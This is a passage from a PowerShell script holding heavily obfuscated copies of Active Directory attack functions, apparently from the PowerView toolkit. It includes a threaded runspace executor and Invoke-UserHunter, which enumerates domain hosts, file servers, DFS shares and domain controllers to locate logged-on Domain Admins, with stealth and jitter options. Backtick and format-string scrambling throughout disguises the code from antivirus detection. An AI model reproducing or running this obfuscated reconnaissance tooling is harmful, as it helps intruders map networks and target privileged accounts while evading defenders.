            if(${ou`T`FiLE}) {&("{5}{6}{3}{2}{4}{0}{1}"-f 'ewC','SV',("{0}{1}"-f'-Pow','er'),'t','Vi','E',("{0}{1}" -f'x','por')) -InputObject ${_} -OutFile ${ou`TF`ile}}
            else {${_}}
        }
    }

    end {
        if(${USEp`SDR`iVE} -and ${Ra`ND`DRivE}) {
            &("{0}{1}{2}" -f'W',("{1}{0}" -f 'ite','r'),("{1}{0}{2}"-f'os','-Verb','e')) (("{1}{0}"-f 'ov','Rem')+'ing'+' '+'tem'+'p '+'PS'+("{1}{0}" -f 'ive','Dr')+' '+"$RandDrive")
            &("{0}{1}{2}"-f 'G',("{2}{1}{0}"-f 'PSDr','t-','e'),'ive') -Name ${ranDD`R`I`Ve} -ErrorAction ("{1}{2}{0}" -f("{2}{1}{0}" -f 'ue','tin','n'),("{0}{1}" -f'Si','len'),("{1}{0}"-f'o','tlyC')) | &("{0}{2}{1}"-f ("{2}{1}{0}" -f 'P','ove-','Rem'),'e',("{1}{0}"-f'v','SDri'))
        }
    }
}








function i`NvOke-tHREa`DEdF`U`NCtioN {
    
    [CmdletBinding()]
    param(
        [Parameter(positIoN=0,mandatOry=${T`Rue})]
        [String[]]
        ${cOMPu`T`ErnA`me},

        [Parameter(POSiTIoN=1,maNdaTORY=${Tr`UE})]
        [System.Management.Automation.ScriptBlock]
        ${sCRI`p`T`BlOCK},

        [Parameter(PoSITiON=2)]
        [Hashtable]
        ${S`CRIPT`PAr`AmetErS},

        [Int]
        ${thReA`Ds} = 20,

        [Switch]
        ${No`Im`pO`RtS}
    )

    begin {

        if (${pSboU`NDPA`Ram`ETe`RS}[("{1}{0}" -f'g',("{0}{1}"-f'Deb','u'))]) {
            ${DeBUGPR`e`FE`R`enCE} = ("{1}{2}{0}"-f'e','Con',("{0}{1}"-f't','inu'))
        }

        &("{4}{1}{0}{2}{3}" -f 'te','i',("{1}{0}"-f'Verb','-'),'ose','Wr') "[*] Total number of hosts: $($ComputerName.count)  "

        
        
        ${sEs`s`ioNsTa`TE} =   ${C`43J}::("{2}{1}{0}" -f ("{0}{1}"-f 'aul','t'),("{1}{0}"-f 'f','teDe'),("{0}{1}" -f'Cre','a'))."i`NVo`kE"()
        ${sE`ssIoN`St`ATe}."ap`Artm`ENt`sTA`TE" =   ${0`Kbl}::"c`URr`E`NtTH`ReAD".("{3}{5}{0}{1}{2}{4}"-f 't','m',("{0}{1}" -f 'entS','t'),("{2}{1}{0}" -f'a','p','GetA'),'ate','r')."iNVo`ke"()

        
        
        if(!${NoiMP`o`RTs}) {

            
            ${MY`VARs} = &("{3}{0}{1}{2}"-f 'e','t',("{3}{2}{0}{1}"-f'riab','le','a','-V'),'G') -Scope 2

            
            ${v`oR`BiDden`V`ARs} = @("?",("{0}{1}"-f'a','rgs'),("{4}{3}{0}{1}{2}" -f ("{1}{0}"-f'Fil','e'),("{1}{0}"-f 'am','eN'),'e','ol',("{0}{1}" -f 'Co','ns')),("{1}{0}" -f 'r',("{1}{0}"-f'ro','Er')),("{1}{2}{0}{3}"-f("{2}{0}{1}"-f 'tio','nCo','ecu'),'E','x',("{1}{0}" -f't','ntex')),("{0}{1}"-f 'f',("{1}{0}" -f 'lse','a')),("{1}{0}" -f'OME','H'),("{0}{1}"-f 'Ho','st'),("{1}{0}"-f ("{0}{1}"-f 'np','ut'),'i'),("{2}{0}{1}"-f'ut',("{0}{1}" -f'Obj','ect'),'Inp'),("{4}{2}{3}{0}{1}" -f'n','t',("{1}{0}"-f'Ali','mum'),("{0}{1}"-f 'as','Cou'),("{0}{1}"-f 'Ma','xi')),("{1}{3}{5}{0}{2}{4}"-f("{1}{0}" -f 'iv','Dr'),("{0}{1}"-f'Ma','xi'),("{1}{0}"-f'n','eCou'),'m','t','um'),("{1}{3}{4}{2}{0}"-f 't',("{2}{1}{0}"-f 'm','u','Maxim'),'n','Err',("{1}{0}"-f'u','orCo')),("{3}{2}{1}{4}{0}" -f'nt','Fu','um',("{0}{1}"-f'Max','im'),("{1}{0}" -f'ctionCou','n')),("{1}{0}{4}{5}{3}{2}" -f ("{2}{0}{1}"-f 'm','umHi','axi'),'M','nt','Cou',("{0}{1}" -f's','tor'),'y'),("{1}{0}{2}{4}{3}"-f ("{1}{0}" -f'ari','ximumV'),'Ma','ab','unt',("{1}{0}" -f 'Co','le')),("{0}{2}{1}" -f ("{0}{1}" -f'M','yIn'),("{1}{0}"-f 'tion','ca'),'vo'),("{0}{1}" -f 'nu','ll'),"PID",("{1}{2}{3}{0}" -f ("{1}{0}" -f 'rs','te'),("{0}{1}"-f'P','SBo'),'und',("{1}{0}"-f'arame','P')),("{1}{3}{0}{2}" -f ("{1}{0}{2}" -f 'ma','om','nd'),'PS',("{1}{0}"-f'h','Pat'),'C'),("{2}{1}{0}"-f'e',("{0}{1}" -f'C','ultur'),'PS'),("{6}{3}{2}{7}{4}{5}{0}{1}" -f'lu','es',("{0}{1}" -f 'ef','au'),'SD','ter','Va','P',("{1}{0}" -f'me','ltPara')),("{0}{1}{2}"-f 'P',("{1}{0}"-f 'HOM','S'),'E'),("{2}{1}{0}" -f ("{0}{1}"-f 'ptRo','ot'),'cri','PSS'),("{2}{1}{0}"-f'e',("{0}{1}" -f'ltu','r'),("{2}{0}{1}"-f'UIC','u','PS')),("{3}{4}{0}{2}{1}" -f 'e',("{1}{0}" -f'ble','Ta'),("{0}{1}" -f'rs','ion'),'PS','V'),"PWD",("{1}{0}" -f'd',("{0}{1}"-f 'Shell','I')),("{0}{2}{3}{1}" -f ("{1}{0}"-f'nc','Sy'),'h',("{1}{0}" -f 'i','hron'),("{2}{0}{1}" -f 'edHa','s','z')),("{0}{1}" -f 'tr','ue'))

            
            ForEach(${V`AR} in ${M`YvarS}) {
                if(${VORbi`D`D`envArs} -NotContains ${v`Ar}."N`AMe") {
                ${ses`s`iOnST`A`Te}."v`A`RIabLEs".("{1}{0}" -f 'd','Ad')."inv`OKE"((&("{0}{1}{2}"-f("{0}{1}"-f'N','ew-Obj'),'e','ct') -TypeName ("{15}{0}{10}{18}{6}{16}{14}{8}{12}{3}{5}{17}{11}{7}{9}{2}{4}{1}{13}{19}" -f's','bl',("{1}{0}"-f'teVari','a'),("{2}{1}{0}" -f'es','spac','n'),'a','.',("{1}{0}"-f 't','.Au'),'sio','tio','nSt',("{0}{1}" -f 'tem','.M'),'es',("{0}{1}"-f'n','.Ru'),("{1}{0}"-f 'Entr','e'),'a','Sy','om','S',("{1}{0}"-f'nt','anageme'),'y') -ArgumentList ${v`Ar}."n`AmE",${v`AR}."Va`LUE",${v`AR}."dESc`RiPT`i`On",${V`Ar}."OP`TIO`NS",${V`AR}."aTT`RI`BUt`es"))
                }
            }

            
            ForEach(${fu`N`CtIoN} in (&("{1}{0}{2}" -f("{1}{0}"-f'dIt','l'),("{0}{1}{2}"-f'Get','-C','hi'),'em') ("{1}{2}{0}"-f ':',("{1}{2}{0}" -f'o','F','uncti'),'n'))) {
                ${SeSSI`O`NS`TaTe}."Comm`A`NDs".("{1}{0}" -f 'd','Ad')."in`VOkE"((&("{1}{2}{0}"-f 'ct',("{0}{1}"-f 'New','-'),("{1}{0}"-f'e','Obj')) -TypeName ("{5}{2}{0}{11}{4}{6}{1}{8}{7}{3}{10}{12}{9}"-f 'ent',("{0}{1}"-f '.R','uns'),("{0}{4}{2}{1}{3}"-f'ys','n','Ma','agem','tem.'),("{1}{0}" -f '.','ces'),'ma','S',("{1}{0}" -f 'on','ti'),'a','p',("{0}{1}{3}{2}"-f'Sta','te','nEntry','Functio'),'Se',("{0}{1}" -f '.Au','to'),("{1}{0}"-f'ion','ss')) -ArgumentList ${FUNC`TI`On}."na`ME", ${Fun`cTI`oN}."De`FINITi`on"))
            }
        }

        
        
        

        
        ${P`oOl} =   (&('gI')  (("{0}{1}"-f'VAr','Iab')+'LE'+("{1}{0}" -f 'gn',':x')+'AiB') )."VA`Lue"::("{5}{2}{1}{0}{4}{3}" -f("{1}{0}" -f'ace','nsp'),'u',("{0}{1}" -f'reate','R'),'l','Poo','C')."inv`oke"(1, ${t`hRea`ds}, ${s`esSiOnS`Ta`TE}, ${H`OST})
        ${p`oOL}.("{0}{1}"-f'Ope','n')."In`Vo`KE"()

        ${J`oBS} = @()
        ${PS} = @()
        ${W`Ait} = @()

        ${coUN`TER} = 0
    }

    process {

        ForEach (${co`MP`UTer} in ${cOm`P`UtE`RnAME}) {

            
            if (${cO`mP`UTer} -ne '') {
                

                While ($(${P`Ool}.("{4}{2}{5}{3}{1}{0}"-f("{2}{0}{1}" -f'pace','s','s'),'un',("{1}{0}" -f 'tAv','e'),'R','G',("{0}{1}" -f'ail','able'))."in`Voke"()) -le 0) {
                    &("{3}{1}{0}{2}"-f 'Sl','-','eep',("{0}{1}"-f 'St','art')) -MilliSeconds 500
                }

                
                ${Ps} +=   ( &("{0}{1}"-f'gC','i') ("{2}{0}{1}{3}" -f 'ArIABle:','b7','V','Fic')  )."vAl`Ue"::("{2}{1}{0}"-f 'te','a','cre')."iN`Vo`KE"()

                ${Ps}[${co`U`NtEr}]."RUNsPAce`P`OOl" = ${pO`Ol}

                
                ${N`UlL} = ${PS}[${cO`UnTER}].("{1}{2}{0}"-f 'pt',("{0}{1}" -f 'Add','S'),'cri')."I`NvOkE"(${sCript`B`LOcK}).("{0}{1}{3}{2}" -f'Ad',("{2}{1}{0}" -f 'amet','ar','dP'),'r','e')."i`Nvo`kE"(("{2}{0}{1}" -f ("{1}{0}" -f 'am','erN'),'e',("{2}{0}{1}"-f 'omp','ut','C')), ${c`oMput`Er})
                if(${Sc`RipTPAR`AME`TERS}) {
                    ForEach (${PAR`AM} in ${SC`R`ipT`P`ARAme`TeRS}.("{0}{3}{1}{2}{4}"-f'Ge','Enu',("{1}{0}"-f'erat','m'),'t','or')."iN`VoKE"()) {
                        ${n`Ull} = ${P`s}[${C`OuN`TEr}].("{2}{0}{1}"-f'e','r',("{2}{3}{0}{1}" -f'am','et','Add','Par'))."I`N`VoKe"(${pAr`AM}."NA`me", ${p`A`RAm}."V`Alue")
                    }
                }

                
                ${J`OBS} += ${p`S}[${c`OuN`Ter}].("{1}{0}{2}"-f("{1}{0}"-f'o','nInv'),("{0}{1}"-f'Beg','i'),'ke')."INV`OkE"();

                
                ${w`AiT} += ${jO`Bs}[${C`OUnT`eR}]."asYnC`WAithan`D`LE"
            }
            ${co`UnT`Er} = ${c`O`UnteR} + 1
        }
    }

    end {

        &("{1}{2}{0}"-f'ose','W',("{3}{2}{1}{0}"-f'b','Ver','-','rite')) ("{4}{2}{1}{0}{7}{3}{5}{6}" -f("{1}{0}"-f'g','nin'),("{1}{0}"-f 'an',' sc'),'or','o ',("{2}{1}{0}"-f 'g f','tin','Wai'),'f',("{1}{2}{0}"-f '..','ini','sh.'),("{1}{2}{0}"-f 's t',' threa','d'))

        ${WA`iT`Ti`mEOut} = &("{1}{0}{2}"-f'at',("{1}{0}" -f't-D','Ge'),'e')

        
        while ($(${jO`Bs} | &("{0}{1}{2}"-f("{0}{1}" -f 'Wher','e-'),("{0}{1}"-f'Obje','c'),'t') {${_}."ISC`omPlE`TED" -eq ${fa`Lse}})."co`UNT" -gt 0 -or $($($(&("{1}{2}{0}" -f("{0}{1}"-f't','-Date'),'G','e')) - ${waiTti`M`E`OUt})."TOTaLse`C`ondS") -gt 60) {
                &("{1}{0}{3}{2}" -f 'r','Sta','eep',("{0}{1}" -f't-S','l')) -MilliSeconds 500
            }

        
        for (${y} = 0; ${Y} -lt ${coUNT`eR}; ${Y}++) {

            try {
                
                ${Ps}[${Y}]."eNdin`VoKe"(${J`oBs}[${Y}])

            } catch {
                &("{2}{0}{1}" -f("{1}{0}"-f 'te-','ri'),("{1}{0}"-f 'ng','Warni'),'W') ('err'+("{1}{0}" -f ': ','or')+"$_")
            }
            finally {
                ${p`s}[${y}].("{2}{1}{0}"-f 'e',("{1}{0}"-f'os','sp'),'Di')."invO`ke"()
            }
        }
        
        ${P`OOL}.("{1}{0}"-f 'ose',("{1}{0}" -f'p','Dis'))."i`NvOKe"()
        &("{2}{0}{1}" -f 'bo','se',("{2}{1}{0}" -f 'er','e-V','Writ')) ("{1}{3}{2}{5}{0}{4}"-f'd',("{1}{0}" -f'l thr','Al'),' co',("{0}{1}"-f 'e','ads'),'!',("{2}{0}{1}"-f'le','te','mp'))
    }
}


function i`NvoK`e-`U`sErHuN`TEr {


    [CmdletBinding()]
    param(
        [Parameter(PoSitIOn=0,vaLuEFroMPIPElinE=${TR`Ue})]
        [Alias({"{0}{1}"-f 'H',{"{1}{0}" -f 'ts','os'}})]
        [String[]]
        ${cO`mPU`TE`RnAME},

        [ValidateScript({&("{2}{0}{1}" -f ("{1}{0}"-f'a','t-P'),'th','Tes') -Path ${_} })]
        [Alias({"{1}{0}"-f 'ist',{"{0}{1}"-f'Ho','stL'}})]
        [String]
        ${Co`mp`UterfI`le},

        [String]
        ${CoMpu`TERF`il`TER},

        [String]
        ${COmp`UTeRaD`s`PaTH},

        [Switch]
        ${U`N`con`sTraINeD},

        [String]
        ${g`RoUpna`ME} = ("{0}{1}{2}"-f'D',("{1}{0}"-f'A','omain '),("{0}{1}"-f'dmin','s')),

        [String]
        ${T`Ar`GETs`ErvEr},

        [String]
        ${Use`Rna`ME},

        [String]
        ${Use`Rf`IlTER},

        [String]
        ${uS`ErA`dsP`AtH},

        [ValidateScript({&("{0}{2}{1}"-f'Tes','h',("{1}{0}" -f'Pat','t-')) -Path ${_} })]
        [String]
        ${u`SeRf`iLe},

        [Switch]
        ${A`DmIN`c`ouNT},

        [Switch]
        ${AlLOwde`LE`GA`TIOn},

        [Switch]
        ${C`hE`ckaCCe`ss},

        [Switch]
        ${sToP`o`NS`UCCESS},

        [Switch]
        ${n`opiNG},

        [UInt32]
        ${d`elaY} = 0,

        [Double]
        ${JiTT`ER} = .3,

        [String]
        ${d`omA`iN},

        [String]
        ${D`omaI`N`ConT`RoLler},

        [Switch]
        ${S`H`OWall},

        [Switch]
        ${SearcHf`OR`eSt},

        [Switch]
        ${stE`A`LTH},

        [String]
        [ValidateSet("DFS","DC",{"{1}{0}" -f 'le','Fi'},"All")]
        ${S`T`eALT`HSoUR`ce} ="All",

        [Switch]
        ${F`oRE`iGNuSe`RS},

        [ValidateRange(1,100)] 
        [Int]
        ${Th`READs}
    )

    begin {

        if (${pS`BouN`Dpar`AMet`e`Rs}[("{0}{1}" -f ("{1}{0}"-f'bu','De'),'g')]) {
            ${De`BugPr`Ef`E`REnCe} = ("{2}{1}{0}" -f'e','inu',("{0}{1}"-f'Co','nt'))
        }

        
        ${RA`NdNO} = &("{0}{2}{3}{1}"-f ("{1}{0}"-f 'w-O','Ne'),'ct','bj','e') ("{1}{2}{0}"-f ("{0}{1}" -f '.R','andom'),("{0}{1}" -f 'Syst','e'),'m')

        &("{2}{1}{0}{3}" -f'bos',("{1}{0}" -f'er','rite-V'),'W','e') ('['+'*] '+("{1}{0}" -f 'unni','R')+'ng '+("{0}{1}" -f 'I','nvok')+'e'+'-Us'+("{0}{2}{1}"-f 'e','er ','rHunt')+'wi'+'th '+'del'+'ay'+' '+'of'+' '+"$Delay")

        
        
        
        
        

        if(${com`p`UteRfI`LE}) {
            
            ${cOMPU`Te`R`NA`ME} = &("{1}{0}{3}{2}" -f'nt',("{0}{2}{1}" -f'Ge','o','t-C'),'t','en') -Path ${C`oMP`Ut`eRFiLE}
        }

        if(!${coM`PUTe`Rn`Ame}) { 
            [Array]${comp`UT`E`RN`AmE} = @()

            if(${d`oM`AIn}) {
                ${ta`RgetDO`mAI`Ns} = @(${doMA`In})
            }
            elseif(${SE`Arc`hfOr`ESt}) {
                
                ${T`ARgeTD`o`m`AInS} = &("{1}{0}{3}{2}" -f("{0}{1}{2}"-f'et','-','Net'),'G',("{0}{1}" -f'mai','n'),("{2}{1}{0}" -f 'o','orestD','F')) | &("{0}{3}{2}{1}"-f ("{0}{1}"-f'Fo','rE'),'t',("{1}{0}" -f 'c','Obje'),("{1}{0}"-f 'h-','ac')) { ${_}."Na`Me" }
            }
            else {
                
                ${Ta`R`gE`TdomAI`Ns} = @( (&("{3}{0}{1}{4}{2}" -f'Dom','a','n',("{1}{0}{2}" -f 't-Ne','Ge','t'),'i'))."NA`me" )
            }
            
            if(${sT`Ea`lth}) {
                &("{2}{1}{0}" -f'e',("{0}{2}{1}"-f'ri','os','te-Verb'),'W') ("{0}{5}{10}{11}{13}{8}{6}{3}{4}{1}{12}{2}{9}{7}" -f'Ste','o',("{1}{0}"-f'ed s','s'),'m','m','a',("{0}{1}" -f'ng',' co'),'s','i',("{1}{0}"-f'ver','er'),("{0}{1}{2}"-f'lth ','mode! Enu','m'),'e',("{0}{1}"-f 'n','ly u'),'rat')
                &("{0}{1}{2}" -f ("{1}{0}" -f 't','Wri'),'e-',("{1}{0}" -f 'se','Verbo')) (("{0}{1}" -f'Steal','t')+'h '+("{1}{0}"-f'ource:','s')+' '+"$StealthSource")

                ForEach (${d`o`mAin} in ${TA`Rge`TdOma`ins}) {
                    if ((${S`Tea`LthS`oU`RCe} -eq ("{0}{1}" -f 'Fil','e')) -or (${Stea`l`THsOUrce} -eq "All")) {
                        &("{0}{2}{1}" -f("{2}{0}{1}" -f'rite-','V','W'),'se',("{0}{1}"-f 'e','rbo')) ('[*]'+' '+'Que'+("{1}{0}" -f 'ng','ryi')+' '+'do'+("{0}{1}" -f'ma','in')+' '+("$Domain "+'')+'fo'+'r '+("{0}{1}"-f'Fil','e')+' '+'Ser'+("{1}{0}" -f'rs.','ve')+'..')
                        ${c`OM`pUTERnaMe} += &("{3}{2}{0}{1}" -f("{2}{0}{1}"-f 'leSer','v','tFi'),'er',("{0}{1}" -f 't-N','e'),'Ge') -Domain ${D`O`MAiN} -DomainController ${Dom`AINCo`NTROlL`Er}
                    }
                    if ((${st`ea`LthSOUR`Ce} -eq "DFS") -or (${STe`A`LthSO`URcE} -eq "All")) {
                        &("{0}{2}{1}"-f'Wr',("{0}{1}" -f'Ve','rbose'),("{0}{1}" -f'ite','-')) ('['+'*] '+("{0}{1}"-f'Qu','eryi')+'ng '+'d'+("{0}{1}" -f 'omain',' ')+("$Domain "+'')+'fo'+'r '+'DFS'+' '+'Se'+'r'+("{1}{2}{0}" -f'..','v','ers.'))
                        ${COMPU`TER`N`AMe} += &("{3}{1}{2}{0}"-f'are','t-D',("{0}{1}"-f'F','Ssh'),'Ge') -Domain ${Do`m`AiN} -DomainController ${DomA`IN`cON`TRO`ll`er} | &("{1}{4}{0}{2}{3}"-f'j',("{0}{1}" -f 'ForEa','c'),'ec','t',("{0}{1}"-f'h-O','b')) {${_}."ReMoteSe`R`VerNa`ME"}
                    }
                    if ((${StE`ALThS`o`URCe} -eq "DC") -or (${S`TEALt`hSO`URCE} -eq "All")) {
                        &("{3}{0}{2}{1}" -f 'e','e',("{1}{0}" -f's','rbo'),("{0}{2}{1}" -f 'Writ','-V','e')) ('[*'+'] '+'Qu'+'e'+("{1}{0}"-f 'ying ','r')+("{1}{0}"-f'in','doma')+' '+("$Domain "+'')+'for'+' '+'Dom'+("{0}{1}" -f'ai','n ')+'Con'+("{0}{1}" -f't','roller')+'s'+'.'+'..')
                        ${cOMPU`Te`RnAME} += &("{6}{5}{3}{1}{0}{4}{2}" -f ("{0}{1}"-f 'n','troll'),("{0}{1}" -f'ainC','o'),'r','m','e','o',("{1}{2}{0}"-f'tD','G','et-Ne')) -LDAP -Domain ${D`O`Main} -DomainController ${do`m`A`incoNTR`oLLer} | &("{1}{0}{2}" -f 'ch',("{1}{0}"-f 'rEa','Fo'),("{0}{1}" -f'-O','bject')) { ${_}."Dn`SHOSTna`me"}
                    }
                }
            }
            else {
                ForEach (${do`ma`In} in ${tar`g`ETdOM`A`INs}) {
                    &("{2}{3}{1}{0}"-f 'e','os',("{1}{0}" -f'te-','Wri'),("{1}{0}"-f'b','Ver')) ('[*'+'] '+'Q'+("{1}{0}" -f 'i','uery')+'ng'+' '+("{0}{1}" -f 'do','mai')+'n '+("$Domain "+'')+'f'+'or '+'ho'+'sts')

                    ${arGu`Me`NTS} = @{
                        ("{0}{1}" -f 'Dom','ain') = ${dO`ma`In}
                        ("{2}{3}{1}{0}"-f("{1}{0}"-f'oller','r'),'nt',("{0}{1}"-f'Do','ma'),("{0}{1}"-f 'in','Co')) = ${doMaI`NCO`NtroLl`Er}
                        ("{1}{0}"-f 'ath',("{1}{0}"-f 'Sp','AD')) = ${aDSPa`Th}
                        ("{1}{0}"-f ("{0}{1}"-f'lte','r'),'Fi') = ${C`OmPU`TeRFI`Lter}
                        ("{1}{3}{2}{0}"-f 'ned',("{0}{1}" -f 'Unc','on'),'ai','str') = ${U`N`Co`NsTraINeD}
                    }

                    ${Com`p`UT`E`RNAmE} += &("{0}{1}{2}"-f("{2}{1}{0}" -f'etComp','t-N','Ge'),'u','ter') @Arguments
                }
            }

            
            ${COm`P`UtErName} = ${CompUT`eRNA`Me} | &("{0}{1}{2}{3}" -f'Wh',("{1}{0}" -f'O','ere-'),'b',("{1}{0}"-f'ect','j')) { ${_} } | &("{1}{3}{0}{2}" -f'jec','Sor','t',("{1}{0}" -f'-Ob','t')) -Unique | &("{2}{1}{0}" -f ("{1}{0}"-f't','jec'),'-Ob',("{0}{1}" -f'So','rt')) { &("{2}{1}{0}" -f 'om',("{0}{1}" -f'-Ran','d'),'Get') }
            if($(${cOMp`UTE`RNA`mE}."Co`UnT") -eq 0) {
                throw ("{2}{0}{3}{1}"-f' f','d!',("{0}{1}"-f 'No ho','sts'),'oun')
            }
        }

        
        
        
        
        

        
        ${Ta`RGetU`SE`Rs} = @()

        
        ${CURREn`TUs`eR} = ( ${Z3`SV`BN}::"uS`erN`AmE").("{0}{2}{1}" -f("{1}{0}"-f 'oLow','t'),'r','e')."i`NVoke"()

        
        if(${sHow`A`lL} -or ${fORe`iG`NU`seRS}) {
            ${U`SER} = &("{0}{2}{3}{1}" -f 'N',("{1}{0}"-f 't','bjec'),'ew-','O') ("{1}{0}" -f("{2}{0}{1}"-f 'O','bject','S'),'P')
            ${u`sER} | &("{1}{0}{2}"-f'd-','Ad',("{2}{0}{1}"-f 'embe','r','M')) ("{2}{0}{1}"-f ("{2}{1}{0}" -f'epro','t','o'),("{1}{0}" -f'rty','pe'),'N') ("{2}{0}{1}" -f'rDo',("{1}{0}" -f 'in','ma'),("{1}{0}" -f'embe','M')) ${n`UlL}
            ${Us`ER} | &("{1}{0}{2}" -f ("{0}{1}"-f'd-M','em'),'Ad','ber') ("{3}{0}{2}{1}"-f("{0}{1}"-f 'tep','ro'),("{0}{1}"-f 'er','ty'),'p','No') ("{1}{2}{0}"-f 'me',("{0}{1}"-f'M','emb'),("{0}{1}"-f 'erN','a')) '*'
            ${TAr`GE`TUs`ERS} = @(${u`SeR})

            if(${fo`REIg`NuSE`RS}) {
                
                ${K`RbTgTN`A`ME} = &("{1}{4}{2}{0}{3}"-f ("{2}{1}{0}" -f't','onical','n'),("{0}{1}" -f 'Co','nve'),'a',("{0}{1}"-f 'oN','T4'),("{1}{0}" -f '-C','rt')) -ObjectName "krbtgt@$($Domain)"
                ${do`MaIN`SHo`R`TnAme} = ${k`RBTg`TN`Ame}.("{1}{0}" -f'lit','sp')."inV`oKE"("\")[0]
            }
        }
        
        elseif(${taR`Ge`TsE`RV`er}) {
            &("{1}{3}{2}{0}" -f ("{1}{0}" -f 'se','bo'),("{0}{1}"-f 'Wr','ite'),'r','-Ve') ('Qu'+'ery'+'ing'+' '+("{1}{0}"-f 'e','targ')+'t '+'s'+("{1}{0}" -f 'r ','erve')+("'$TargetServer' "+'')+'for'+' '+'l'+'oc'+'al '+("{0}{1}" -f'u','ser')+'s')
            ${ta`R`getuS`eRS} = &("{0}{1}{2}{3}"-f ("{1}{0}" -f '-','Get'),("{1}{0}"-f 'cal','NetLo'),'G',("{0}{1}" -f 'rou','p')) ${T`A`Rge`TseR`Ver} -Recurse | &("{1}{2}{0}"-f 'ct',("{0}{1}"-f'Wh','ere'),("{0}{1}" -f '-','Obje')) {(-not ${_}."I`sGRoUp") -and ${_}."Is`d`Omain" } | &("{2}{3}{1}{4}{0}"-f 'ect','-O','Fo',("{1}{0}" -f 'Each','r'),'bj') {
                ${uS`Er} = &("{0}{2}{1}" -f'Ne',("{1}{0}{2}" -f'Objec','-','t'),'w') ("{0}{1}" -f 'PSO',("{0}{1}" -f'b','ject'))
                ${u`SEr} | &("{2}{0}{1}"-f'emb','er',("{1}{0}" -f '-M','Add')) ("{2}{0}{1}" -f't','y',("{2}{1}{0}" -f 'eproper','ot','N')) ("{0}{1}{2}" -f("{1}{0}" -f'rD','Membe'),'o',("{1}{0}" -f 'in','ma')) (${_}."aCC`Ou`NTnaME").("{0}{1}" -f 's',("{1}{0}" -f 't','pli'))."i`N`Voke"("/")[0].("{2}{1}{0}"-f 'r',("{0}{1}"-f 'Lo','we'),'to')."iN`V`oKE"() 
                ${Us`Er} | &("{2}{0}{1}" -f'm','ber',("{0}{1}{2}"-f'Add','-','Me')) ("{3}{2}{1}{0}"-f ("{1}{0}" -f'rty','e'),'p',("{1}{0}" -f 'epro','t'),'No') ("{0}{2}{1}"-f'M','e',("{1}{0}{2}"-f'mberN','e','am')) (${_}."A`ccOUn`TN`Ame").("{1}{0}"-f 'lit','sp')."IN`VokE"("/")[1].("{1}{0}{2}"-f("{0}{1}"-f'oL','ow'),'t','er')."inV`oKE"() 
                ${u`ser}
            }  | &("{0}{3}{1}{2}"-f 'W',("{0}{1}"-f 'e-Obj','ec'),'t','her') {${_}}
        }
        
        elseif(${US`E`RNaMe}) {
            &("{0}{1}{3}{2}" -f("{0}{1}"-f 'W','rit'),'e-V','se',("{1}{0}" -f 'o','erb')) ('[*]'+' '+'U'+("{0}{1}" -f'sing',' ')+'t'+("{1}{0}"-f'et','arg')+' '+'use'+'r '+"'$UserName'...")
            ${u`seR} = &("{2}{1}{0}" -f ("{1}{0}"-f 't','Objec'),'ew-','N') ("{0}{1}{2}" -f("{0}{1}" -f'PS','Ob'),'j','ect')
            if(${t`Arge`TdoMAi`NS}) {
                ${Us`Er} | &("{1}{0}{2}"-f ("{0}{1}"-f'd-Mem','b'),'Ad','er') ("{2}{0}{1}"-f'op',("{0}{1}"-f 'ert','y'),("{0}{1}"-f 'Note','pr')) ("{3}{1}{0}{2}" -f'r','e',("{0}{1}"-f'D','omain'),("{1}{0}"-f'emb','M')) ${Targ`etD`omAINS}[0]
            }
            else {
                ${Us`ER} | &("{0}{1}{2}" -f("{1}{0}"-f'dd-Mem','A'),'b','er') ("{3}{0}{1}{2}" -f 'ot',("{2}{0}{1}"-f 'p','rope','e'),'rty','N') ("{3}{0}{1}{2}"-f ("{0}{1}" -f'Do','ma'),'i','n',("{2}{0}{1}" -f 'em','ber','M')) ${nU`lL}
            }
            ${us`ER} | &("{1}{0}{2}"-f'-Me','Add',("{0}{1}"-f'mbe','r')) ("{1}{3}{2}{0}"-f ("{1}{0}"-f'y','ert'),'N',("{0}{1}"-f'pro','p'),'ote') ("{1}{0}{2}" -f'rNa',("{1}{0}" -f'e','Memb'),'me') ${USe`RnA`Me}.("{2}{1}{0}" -f("{1}{0}" -f'er','Low'),'o','T')."i`NVo`ke"()
            ${T`AR`GETUSeRs} = @(${us`er})
        }
        
        elseif(${UsEr`FI`le}) {
            ${TARGEtU`s`E`RS} = &("{3}{1}{2}{0}" -f 'nt','Co','nte',("{1}{0}" -f 'et-','G')) -Path ${UsE`RFi`Le} | &("{2}{0}{3}{1}" -f'-O',("{1}{0}"-f 't','jec'),("{0}{1}"-f 'Fo','rEach'),'b') {
                ${US`ER} = &("{0}{3}{1}{2}" -f'N','ec','t',("{2}{1}{0}"-f 'j','-Ob','ew')) ("{0}{1}" -f("{2}{1}{0}" -f 'je','b','PSO'),'ct')
                if(${T`ArGeTDOm`AInS}) {
                    ${uS`ER} | &("{2}{0}{3}{1}" -f("{1}{0}" -f 'Me','dd-'),'ber','A','m') ("{2}{0}{1}{3}"-f'e','p','Not',("{0}{1}" -f'ropert','y')) ("{2}{1}{0}"-f 'ain',("{0}{1}" -f 'berDo','m'),'Mem') ${TargeT`domai`Ns}[0]
                }
                else {
                    ${u`SEr} | &("{1}{0}{2}"-f'e',("{0}{2}{1}"-f 'Add','b','-Mem'),'r') ("{3}{1}{2}{0}"-f 'ty',("{0}{1}" -f 'epro','pe'),'r','Not') ("{2}{0}{1}{3}" -f'em',("{0}{2}{1}"-f'b','i','erDoma'),'M','n') ${NU`ll}
                }
                ${u`SEr} | &("{1}{0}{2}" -f'Mem',("{0}{1}" -f'A','dd-'),'ber') ("{0}{1}{3}{2}" -f'Not','e','ty',("{1}{2}{0}"-f 'oper','p','r')) ("{2}{1}{0}{3}"-f 'm',("{0}{1}" -f'er','Na'),("{0}{1}"-f'M','emb'),'e') ${_}
                ${uS`Er}
            }  | &("{3}{1}{2}{0}" -f 'ct',("{1}{0}" -f 'e-Obj','er'),'e','Wh') {${_}}
        }
        elseif(${useRad`Sp`Ath} -or ${U`seRf`iLtER} -or ${adMiN`C`OUnT}) {
            ForEach (${DOM`A`In} in ${TA`R`gEtD`oMaiNs}) {

                ${aR`guME`NtS} = @{
                    ("{0}{1}" -f("{1}{0}" -f'ai','Dom'),'n') = ${DO`mA`in}
                    ("{3}{2}{1}{4}{0}"-f 'ler',("{1}{0}" -f'ntro','o'),("{2}{0}{1}"-f 'n','C','omai'),'D','l') = ${dOmA`In`c`ONTROLl`er}
                    ("{1}{0}"-f ("{1}{0}"-f'h','Spat'),'AD') = ${U`SeraD`SPa`Th}
                    ("{1}{0}" -f'r',("{0}{1}" -f'Filt','e')) = ${Us`erFiLT`eR}
